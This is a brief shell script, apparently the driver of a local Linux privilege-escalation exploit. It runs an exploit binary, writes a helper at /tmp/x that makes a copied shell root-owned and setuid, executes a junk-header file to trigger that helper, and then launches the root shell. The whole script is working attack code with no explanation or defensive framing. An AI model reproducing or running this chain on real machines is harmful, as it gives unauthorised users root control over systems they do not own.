#!/bin/sh

./exploit

cp ./shell /tmp/shell

printf '#!/bin/sh\nchown root /tmp/shell\nchmod +s /tmp/shell' > /tmp/x
chmod +x /tmp/x

echo -ne '\xff\xff\xff\xff' > /tmp/y
chmod +x /tmp/y && /tmp/y

/tmp/shell
